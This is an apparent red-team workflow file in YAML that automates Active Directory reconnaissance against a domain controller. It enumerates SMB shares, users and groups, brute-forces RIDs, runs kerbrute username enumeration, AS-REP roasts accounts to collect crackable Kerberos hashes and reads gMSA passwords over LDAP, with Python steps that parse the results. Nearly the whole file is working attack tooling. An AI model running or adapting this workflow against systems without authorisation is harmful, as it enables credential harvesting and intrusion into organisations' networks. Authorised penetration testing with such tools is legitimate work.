# yaml-language-server: $schema=~/.ofx/workflow_schema.json
name: ad-enum
description: >
  Active Directory enumeration — discovers users, shares, groups, policies, and service accounts
  using SMB, LDAP, and Kerberos protocols.
tags: [redteam, ad, enum, smb, ldap, kerberos]

dispatch:
  inputs:
    target:
      required: true
      type: string
      description: Domain controller IP or hostname
    domain:
      required: true
      type: string
      description: AD domain name (e.g. corp.local)
    username:
      type: string
      default: ""
      description: Username for authenticated enum
    password:
      type: string
      default: ""
      description: Password or NTLM hash

jobs:
  smb-enum:
    name: "SMB Enumeration"
    steps:
      - name: nxc-smb-shares
        run: |
          netexec smb {{ inputs.target }} {{ '-u ' + inputs.username + ' -p ' + inputs.password if inputs.username else '-u "" -p ""' }} --shares 2>/dev/null | tee /tmp/nxc-shares.txt
        continue-on-error: true

      - name: nxc-smb-users
        run: |
          netexec smb {{ inputs.target }} {{ '-u ' + inputs.username + ' -p ' + inputs.password if inputs.username else '-u "" -p ""' }} --users 2>/dev/null | tee /tmp/nxc-users.txt
        continue-on-error: true

      - name: nxc-smb-groups
        run: |
          netexec smb {{ inputs.target }} {{ '-u ' + inputs.username + ' -p ' + inputs.password if inputs.username else '-u "" -p ""' }} --groups 2>/dev/null | tee /tmp/nxc-groups.txt
        continue-on-error: true

      - name: nxc-smb-sessions
        run: |
          netexec smb {{ inputs.target }} {{ '-u ' + inputs.username + ' -p ' + inputs.password if inputs.username else '-u "" -p ""' }} --sessions 2>/dev/null | tee /tmp/nxc-sessions.txt
        continue-on-error: true

      - name: nxc-smb-passpol
        run: |
          netexec smb {{ inputs.target }} {{ '-u ' + inputs.username + ' -p ' + inputs.password if inputs.username else '-u "" -p ""' }} --pass-pol 2>/dev/null | tee /tmp/nxc-passpol.txt
        continue-on-error: true

      - name: nxc-rid-brute
        run: |
          netexec smb {{ inputs.target }} {{ '-u ' + inputs.username + ' -p ' + inputs.password if inputs.username else '-u "" -p ""' }} --rid-brute 2>/dev/null | tee /tmp/nxc-rid.txt
        continue-on-error: true

      - name: enum4linux-scan
        run: |
          enum4linux-ng -A {{ '-u ' + inputs.username + ' -p ' + inputs.password if inputs.username else '' }} {{ inputs.target }} 2>/dev/null | tee /tmp/enum4linux-output.txt
        continue-on-error: true

      - name: collect-smb
        script: |
          import re

          users = set()
          shares = set()
          groups = set()

          # Parse RID brute results for users
          try:
              with open('/tmp/nxc-rid.txt') as f:
                  for line in f:
                      match = re.search(r'SidTypeUser\)\s+\\(.+?)(?:\s|$)', line)
                      if match:
                          users.add(match.group(1).strip())
          except FileNotFoundError:
              pass

          # Parse users
          try:
              with open('/tmp/nxc-users.txt') as f:
                  for line in f:
                      match = re.search(r'SMB\s+.*\s+(\S+\\)?(\S+)\s+', line)
                      if match:
                          users.add(match.group(2).strip())
          except FileNotFoundError:
              pass

          # Parse shares
          try:
              with open('/tmp/nxc-shares.txt') as f:
                  for line in f:
                      match = re.search(r'SMB\s+.*\s+([\w$]+)\s+(READ|WRITE|NO ACCESS)', line)
                      if match:
                          shares.add(match.group(1).strip())
          except FileNotFoundError:
              pass

          # Parse groups
          try:
              with open('/tmp/nxc-groups.txt') as f:
                  for line in f:
                      match = re.search(r'SMB\s+.*\s+(.+?)\s+membercount:', line)
                      if match:
                          groups.add(match.group(1).strip())
          except FileNotFoundError:
              pass

          with open('{{ env.OFX_OUTPUTS }}', 'a') as f:
              f.write(f"smb_users={chr(10).join(sorted(users))}\n")
              f.write(f"smb_user_count={len(users)}\n")
              f.write(f"smb_shares={chr(10).join(sorted(shares))}\n")
              f.write(f"smb_share_count={len(shares)}\n")
              f.write(f"smb_groups={chr(10).join(sorted(groups))}\n")
              f.write(f"smb_group_count={len(groups)}\n")

          print(f"SMB enum: {len(users)} users, {len(shares)} shares, {len(groups)} groups")

  kerberos-enum:
    name: "Kerberos Enumeration"
    steps:
      - name: kerbrute-userenum
        run: |
          kerbrute userenum --dc {{ inputs.target }} -d {{ inputs.domain }} /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames-dup.txt 2>/dev/null | tee /tmp/kerbrute-users.txt
        continue-on-error: true

      - name: asrep-roast
        run: |
          netexec ldap {{ inputs.target }} -u {{ inputs.username if inputs.username else '""' }} -p {{ inputs.password if inputs.password else '""' }} --asreproast /tmp/asrep-hashes.txt 2>/dev/null | tee /tmp/asrep-output.txt
        continue-on-error: true

      - name: collect-kerberos
        script: |
          import re

          kerb_users = set()
          asrep_users = set()

          # Parse kerbrute results
          try:
              with open('/tmp/kerbrute-users.txt') as f:
                  for line in f:
                      match = re.search(r'VALID USERNAME:\s+(\S+)@', line)
                      if match:
                          kerb_users.add(match.group(1))
          except FileNotFoundError:
              pass

          # Parse AS-REP roastable users
          try:
              with open('/tmp/asrep-hashes.txt') as f:
                  for line in f:
                      if line.startswith('$krb5asrep$'):
                          match = re.search(r'\$krb5asrep\$23?\$(.+?)@', line)
                          if match:
                              asrep_users.add(match.group(1))
          except FileNotFoundError:
              pass

          with open('{{ env.OFX_OUTPUTS }}', 'a') as f:
              f.write(f"kerb_users={chr(10).join(sorted(kerb_users))}\n")
              f.write(f"kerb_user_count={len(kerb_users)}\n")
              f.write(f"asrep_users={chr(10).join(sorted(asrep_users))}\n")
              f.write(f"asrep_count={len(asrep_users)}\n")

          print(f"Kerberos: {len(kerb_users)} valid users, {len(asrep_users)} AS-REP roastable")

  ldap-enum:
    name: "LDAP Enumeration"
    steps:
      - name: nxc-ldap-users
        run: |
          {% if inputs.username %}
          netexec ldap {{ inputs.target }} -u {{ inputs.username }} -p {{ inputs.password }} --users 2>/dev/null | tee /tmp/ldap-users.txt
          {% else %}
          echo "Skipping LDAP user enum (no credentials provided)"
          {% endif %}
        continue-on-error: true

      - name: nxc-ldap-gmsa
        run: |
          {% if inputs.username %}
          netexec ldap {{ inputs.target }} -u {{ inputs.username }} -p {{ inputs.password }} --gmsa 2>/dev/null | tee /tmp/ldap-gmsa.txt
          {% else %}
          echo "Skipping LDAP gMSA enum (no credentials provided)"
          {% endif %}
        continue-on-error: true

      - name: collect-ldap
        script: |
          import re

          ldap_users = set()

          try:
              with open('/tmp/ldap-users.txt') as f:
                  for line in f:
                      match = re.search(r'LDAP\s+.*\s+(\S+)\s+', line)
                      if match:
                          user = match.group(1).strip()
                          if user and user not in ('LDAP', '445', '[*]', '[+]'):
                              ldap_users.add(user)
          except FileNotFoundError:
              pass

          with open('{{ env.OFX_OUTPUTS }}', 'a') as f:
              f.write(f"ldap_users={chr(10).join(sorted(ldap_users))}\n")
              f.write(f"ldap_user_count={len(ldap_users)}\n")

          print(f"LDAP enum: {len(ldap_users)} users")

  summary:
    name: "AD Enumeration Summary"
    needs: [smb-enum, kerberos-enum, ldap-enum]
    steps:
      - name: report
        run: |
          echo "======================================================"
          echo " AD ENUMERATION COMPLETE: {{ inputs.target }}"
          echo " Domain: {{ inputs.domain }}"
          echo "======================================================"
          echo ""
          echo "--- SMB Enumeration ---"
          echo "Users found: {{ jobs['smb-enum'].outputs.smb_user_count }}"
          echo "Shares found: {{ jobs['smb-enum'].outputs.smb_share_count }}"
          echo "Groups found: {{ jobs['smb-enum'].outputs.smb_group_count }}"
          echo ""
          echo "--- Kerberos Enumeration ---"
          echo "Valid users: {{ jobs['kerberos-enum'].outputs.kerb_user_count }}"
          echo "AS-REP roastable: {{ jobs['kerberos-enum'].outputs.asrep_count }}"
          echo ""
          echo "--- LDAP Enumeration ---"
          echo "LDAP users: {{ jobs['ldap-enum'].outputs.ldap_user_count }}"
